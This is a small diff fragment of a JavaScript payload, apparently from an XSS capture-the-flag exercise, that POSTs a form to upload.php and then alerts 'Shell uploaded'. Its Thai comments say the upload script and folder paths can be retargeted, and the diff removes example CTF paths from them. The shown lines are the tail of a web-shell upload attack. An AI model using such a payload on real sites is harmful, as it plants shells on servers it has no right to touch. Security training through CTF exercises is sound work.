@@ -20,10 +20,10 @@
         method: 'POST',
         body: form
       });
-    }) //สามารถเปลี่ยน Part เป้าหมายของไฟล์ upload.php ได้ เช่น /xss01CTF/upload.php
+    }) //สามารถเปลี่ยน Part เป้าหมายของไฟล์ upload.php ได้
     .then(() => {
       alert('Shell uploaded: /upload/' + filename);
-    }); //สามารถเปลี่ยน Part เป้าหมายของโฟเดอร์ ีuploadได้ เช่น /xss01CTF/upload/
+    }); //สามารถเปลี่ยน Part เป้าหมายของโฟเดอร์ ีuploadได้
 
 })();
 </script>
